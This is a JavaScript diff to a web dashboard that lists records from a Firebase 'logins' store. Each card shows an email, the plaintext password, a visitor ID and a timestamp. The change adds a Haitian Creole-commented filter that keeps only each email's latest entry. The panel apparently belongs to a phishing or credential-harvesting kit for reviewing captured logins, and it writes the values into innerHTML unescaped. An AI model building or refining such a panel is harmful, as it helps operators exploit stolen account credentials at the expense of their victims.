@@ -505,17 +505,26 @@ db.ref("logins").on("value", (snapshot) => {
     return;
   }
 
-  const entries = Object.entries(data).sort((a, b) => b[1].time - a[1].time);
+  // ✅ FILTRE DOUB — kenbe sèlman dènye koneksyon pa email
+  const uniqueLogins = {};
+  Object.entries(data).forEach(([id, log]) => {
+    const email = log.email || "Anonim";
+    if (!uniqueLogins[email] || log.time > uniqueLogins[email].time) {
+      uniqueLogins[email] = { id, ...log };
+    }
+  });
+
+  const entries = Object.values(uniqueLogins).sort((a, b) => b.time - a.time);
   loginCount.innerText = entries.length;
 
-  entries.forEach(([id, log]) => {
+  entries.forEach((log) => {
     const div = document.createElement("div");
     div.className = "loc-card";
     div.innerHTML = `
       <div class="name">📧 ${log.email || "Anonim"}</div>
       <div class="info">
         🔑 Modpas: <strong style="color:#ff9800;">${log.password || "—"}</strong><br>
-        🆔 ${log.visitorId || id}<br>
+        🆔 ${log.visitorId || log.id}<br>
         🕐 ${new Date(log.time).toLocaleString()}
       </div>
     `;
